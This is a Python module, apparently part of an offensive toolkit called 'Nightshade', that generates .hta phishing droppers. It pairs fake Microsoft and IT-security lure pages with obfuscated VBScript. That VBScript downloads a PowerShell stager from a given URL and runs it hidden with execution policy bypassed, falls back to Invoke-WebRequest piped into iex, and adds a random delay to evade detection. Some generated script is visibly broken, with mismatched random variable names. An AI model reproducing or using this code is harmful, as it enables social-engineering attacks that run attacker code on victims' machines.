"""
Nightshade HTA Dropper Generator.
Creates .hta files with embedded VBScript/JavaScript that execute
PowerShell stagers in hidden windows. Uses realistic lure content.
No "Enable Content" needed -- auto-executes on open.
"""
import random
import string
import base64
from typing import Optional


class HTADropper:
    """Generate an .hta dropper file with embedded VBScript stager."""

    # Realistic lure titles for social engineering
    LURE_TITLES = [
        "IT Security Notice - Critical Update Required",
        "Microsoft Exchange Security Patch Notification",
        "Corporate VPN Certificate Renewal",
        "Quarterly Compliance Self-Assessment Form",
        "Employee Benefits Enrollment Confirmation",
        "Windows Defender Signature Update Required",
        "Remote Desktop Configuration Change Notice",
        "Active Directory Credential Verification",
        "Network Access Control Policy Update",
        "Software License Compliance Audit",
    ]

    LURE_MESSAGES = [
        "Your system requires an immediate security update. Please allow the update to complete.",
        "Critical patch for CVE-2024-38112 detected on your workstation. Installing required updates.",
        "Your VPN certificate will expire in 7 days. Renewal process has been initiated automatically.",
        "Compliance scan has detected outdated security definitions. Running update now...",
        "Corporate security policy requires verification of installed software licenses. Scanning...",
        "Unsupported protocol detected in recent network traffic. Applying configuration fix...",
        "Credential verification required before network access can be restored.",
        "Software license audit in progress. This process will complete in the background.",
    ]

    @staticmethod
    def _random_string(length: int = 8) -> str:
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    @staticmethod
    def _obfuscate_vbs_string(s: str) -> str:
        """Obfuscate a VBS string using Char() concatenation."""
        parts = []
        for c in s:
            method = random.randint(1, 3)
            if method == 1:
                parts.append(f"Chr({ord(c)})")
            elif method == 2:
                parts.append(f"ChrW({ord(c)})")
            else:
                parts.append(f"Chr({ord(c) & 0xFF})")
        if random.random() < 0.5:
            return " & ".join(parts)
        else:
            return " & ".join(parts)

    @staticmethod
    def _powershell_stager_vbs(powershell_command: str) -> str:
        """Generate VBScript that executes a PowerShell command in a hidden window."""
        r1 = HTADropper._random_string()
        r2 = HTADropper._random_string()

        return f'''
{r1} = "{powershell_command}"

' Execute PowerShell in hidden window
Set {r2} = CreateObject("WScript.Shell")
{r2}.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & {r1} & """", 0, False
Set {r2} = Nothing
'''

    @staticmethod
    def vbs_download_and_execute(url: str, obfuscate: bool = True) -> str:
        """Generate VBScript that downloads and executes a PowerShell stager."""
        r1 = HTADropper._random_string()
        r2 = HTADropper._random_string()
        r3 = HTADropper._random_string()
        r4 = HTADropper._random_string()
        r5 = HTADropper._random_string()

        url_obs = HTADropper._obfuscate_vbs_string(url) if obfuscate else f'"{url}"'

        return f'''
' Stage 0: Download and execute PowerShell stager
Dim {r1}, {r2}, {r3}, {r4}, {r5}

' OPSEC delay
Randomize Timer
{r5} = Int((5000 * Rnd) + 2000)
WScript.Sleep {r5}

' Download stager
Set {r1} = CreateObject("MSXML2.XMLHTTP.6.0")
{r1}.Open "GET", {url_obs}, False
{r1}.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
{r1}.Send

If {r1}.Status = 200 Then
    {r2} = {r1}.ResponseText
    
    ' Write to temp file and execute
    Set {r3} = CreateObject("Scripting.FileSystemObject")
    {r4} = {r3}.GetSpecialFolder(2) & Chr(92) & "~upd.ps1"
    
    Set {r5} = {r3}.CreateTextFile({r4}, True)
    {r5}.Write {r2}
    {r5}.Close
    
    Set {r1} = CreateObject("WScript.Shell")
    {r1}.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & {r4} & """", 0, False
Else
    ' Fallback: direct execution
    Set {r1} = CreateObject("WScript.Shell")
    {r1}.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""& {{ """ & url_obs & """ = Invoke-WebRequest -UseBasicParsing; iex """ & url_obs & """.Content }}""", 0, False
End If

Set {r1} = Nothing
Set {r3} = Nothing
Set {r5} = Nothing
'''

    @staticmethod
    def _html_lure(title: str, message: str) -> str:
        """Generate the HTML lure content for the HTA."""
        return f'''
<html>
<head>
<title>{title}</title>
<HTA:APPLICATION
    ID="NightshadeUpdate"
    APPLICATIONNAME="SecurityUpdate"
    WINDOWSTATE="normal"
    SHOWINTASKBAR="yes"
    SINGLEINSTANCE="yes"
    SYSMENU="yes"
    BORDER="dialog"
    INNERBORDER="no"
    CONTEXTMENU="no"
    SELECTION="no"
    MINIMIZEBUTTON="no"
    MAXIMIZEBUTTON="no"
    NAVIGABLE="yes"
    SCROLL="auto"
    CAPTION="yes"
/>
<style>
    body {{ font-family: 'Segoe UI', Tahoma, Verdana, sans-serif; margin: 20px; background-color: #f0f0f0; }}
    .container {{ background: white; border: 1px solid #ccc; border-radius: 8px; padding: 25px; max-width: 500px; margin: 40px auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
    .header {{ border-bottom: 2px solid #0078d7; padding-bottom: 10px; margin-bottom: 15px; }}
    .header h2 {{ color: #0078d7; margin: 0; font-size: 18px; }}
    .header p {{ color: #666; margin: 5px 0 0; font-size: 12px; }}
    .content {{ color: #333; font-size: 13px; line-height: 1.5; }}
    .progress {{ margin: 20px 0; }}
    .progress-bar {{ height: 20px; background: #0078d7; width: 0%; border-radius: 3px; animation: progressAnim 3s ease-in-out forwards; }}
    @keyframes progressAnim {{ 0% {{ width: 0%; }} 50% {{ width: 55%; }} 100% {{ width: 100%; }} }}
    .footer {{ margin-top: 20px; padding-top: 10px; border-top: 1px solid #eee; font-size: 11px; color: #888; }}
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h2>{title}</h2>
        <p>Microsoft Security Response Center</p>
    </div>
    <div class="content">
        <p>{message}</p>
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
        <p>This window will close automatically once the update is complete.</p>
    </div>
    <div class="footer">
        <p>&copy; Microsoft Corporation. All rights reserved.</p>
    </div>
</div>
</body>
</html>
'''

    @staticmethod
    def build_hta_from_url(url: str, output_path: str, title: str = "", message: str = ""):
        """Build an .hta file that downloads and executes a PowerShell stager from a URL."""
        if not title:
            title = random.choice(HTADropper.LURE_TITLES)
        if not message:
            message = random.choice(HTADropper.LURE_MESSAGES)

        vbs = HTADropper.vbs_download_and_execute(url)
        html = HTADropper._html_lure(title, message)

        hta_content = f'''{vbs}
{html}
<script language="VBScript">
{HTADropper._powershell_stager_vbs("")}
</script>
<script language="JavaScript">
window.setTimeout(function() {{
    window.close();
}}, 5000);
</script>
'''

        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(hta_content)

        return output_path

    @staticmethod
    def build_hta_embedded(ps_command: str, output_path: str, title: str = "", message: str = ""):
        """Build an .hta file with an embedded PowerShell command."""
        if not title:
            title = random.choice(HTADropper.LURE_TITLES)
        if not message:
            message = random.choice(HTADropper.LURE_MESSAGES)

        import base64
        ps_b64 = base64.b64encode(ps_command.encode('utf-16le')).decode()
        encoded_cmd = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"

        vbs = f'''
Dim {HTADropper._random_string()}, {HTADropper._random_string()}
Set {HTADropper._random_string()} = CreateObject("WScript.Shell")
{HTADropper._random_string()}.Run "{encoded_cmd}", 0, False
Set {HTADropper._random_string()} = Nothing
'''

        html = HTADropper._html_lure(title, message)

        hta_content = vbs + '\n' + html

        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(hta_content)

        return output_path
